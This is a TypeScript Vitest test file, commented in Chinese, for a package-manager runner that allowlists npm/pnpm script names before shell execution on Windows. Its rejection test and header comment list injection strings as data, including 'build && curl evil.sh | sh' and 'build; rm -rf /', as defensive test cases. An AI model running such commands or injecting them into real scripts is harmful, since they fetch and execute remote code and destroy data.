/**
 * 模块职责：包管理器动作的 script 名白名单与实参译法测试
 * 依赖方向：测试文件，依赖 plugin/pm
 * 生命周期：无状态，无临时目录；runner 的选择逻辑经 `createPmRunner` 注入假执行器来测
 * 注意事项：**这里钉的是一道安全边界。** `runPm` 在 Windows 上必须带 shell 执行（pnpm/npm
 *          是 `.cmd`，node 在 CVE-2024-27980 之后拒绝不经 shell 起它们），而带了 shell
 *          之后参数就是被解释的字符串 —— 索引里一个 `build && curl … | sh` 就是任意命令
 *          执行。唯一的可变部分是 script 名，故白名单的每一类拒绝都要有用例。
 *
 *          **不起真实子进程。** 起了就得在开发机上装 pnpm、联网、并等上几分钟，而那验的是
 *          pnpm 自己而非本模块。本模块要负责的只有「下发了什么」。
 */
import { describe, expect, it } from "vitest"
import {
  INSTALL_TIMEOUT_MS,
  PACKAGE_MANAGERS,
  SCRIPT_TIMEOUT_MS,
  assertScriptName,
  createPmRunner,
  isScriptName
} from "./pm.js"

describe("createPmRunner", () => {
  /**
   * 造一个记录调用的执行器
   * @param installed 视为已装的包管理器
   * @param failing 执行正式命令时失败的包管理器
   */
  function fakeExec(installed: string[], failing: string[] = []) {
    const calls: string[] = []
    const execute = async (cmd: string, args: string[]): Promise<void> => {
      calls.push(`${cmd} ${args.join(" ")}`)
      if (!installed.includes(cmd)) throw new Error("不是内部或外部命令")
      if (args[0] !== "--version" && failing.includes(cmd)) throw new Error("ERR_PNPM_FETCH_404")
    }
    return { calls, execute }
  }

  it("pnpm 已装但执行失败时直接报错，不在同一目录再跑一遍 npm", async () => {
    const { calls, execute } = fakeExec(["pnpm", "npm"], ["pnpm"])
    await expect(createPmRunner(execute)({ kind: "install", dev: false }, "/p", 1000)).rejects.toThrow(
      "pnpm 执行失败：ERR_PNPM_FETCH_404"
    )
    expect(calls).toEqual(["pnpm --version", "pnpm install --prod"])
  })

  it("没装 pnpm 时用 npm", async () => {
    const { calls, execute } = fakeExec(["npm"])
    await expect(createPmRunner(execute)({ kind: "run", script: "build" }, "/p", 1000)).resolves.toBe("npm")
    expect(calls).toEqual(["pnpm --version", "npm --version", "npm run build"])
  })

  it("一个都没装时说清试过哪些", async () => {
    const { execute } = fakeExec([])
    await expect(createPmRunner(execute)({ kind: "install", dev: true }, "/p", 1000)).rejects.toThrow("试过 pnpm、npm")
  })
})

describe("isScriptName", () => {
  it("接受常规 script 名，含冒号分段", () => {
    for (const good of ["build", "install:browser", "test", "build2", "a", "lint-fix", "check.all", "a_b"]) {
      expect(isScriptName(good), good).toBe(true)
    }
  })

  it("拒绝一切 shell 元字符 —— 这一条即那道边界本身", () => {
    /*
     * 逐类都要有：命令分隔（`;` `&&` `|`）、命令替换（`$()` 反引号）、重定向（`>`）、
     * 换行、以及空格 —— 带 shell 执行时它们各自都足以在后面接上第二条命令。
     */
    for (const bad of [
      "build && curl evil.sh | sh",
      "build; rm -rf /",
      "build|tee x",
      "build $(whoami)",
      "build `whoami`",
      "build > out.txt",
      "build\nrm x",
      "build x",
      "--version",
      "-x",
      "",
      "  ",
      ":build",
      "build/../../x",
      "build\\x",
      'build"x',
      "build'x"
    ]) {
      expect(isScriptName(bad), bad).toBe(false)
    }
  })
})

describe("assertScriptName", () => {
  it("合法时原样返回，不合法时抛错且话里带上那个名字", () => {
    expect(assertScriptName("install:browser")).toBe("install:browser")
    // 错误信息要带上原名：索引写错时，看到是哪个名字被拒才找得到该改哪一行
    expect(() => assertScriptName("build && x")).toThrow("build && x")
  })
})

describe("常量", () => {
  it("pnpm 在 npm 之前 —— 本项目各插件的 lock 文件都是 pnpm 的", () => {
    expect(PACKAGE_MANAGERS).toEqual(["pnpm", "npm"])
  })

  it("两个超时都远长于任何网络请求", () => {
    /*
     * 装依赖的超时短了，后果是留下一个装了一半的 `node_modules` —— 那比等下去更难收拾。
     * 跑 script 同理：`install:browser` 拉的是上百兆的 Chromium。
     */
    expect(INSTALL_TIMEOUT_MS).toBeGreaterThanOrEqual(10 * 60 * 1000)
    expect(SCRIPT_TIMEOUT_MS).toBeGreaterThanOrEqual(10 * 60 * 1000)
  })
})
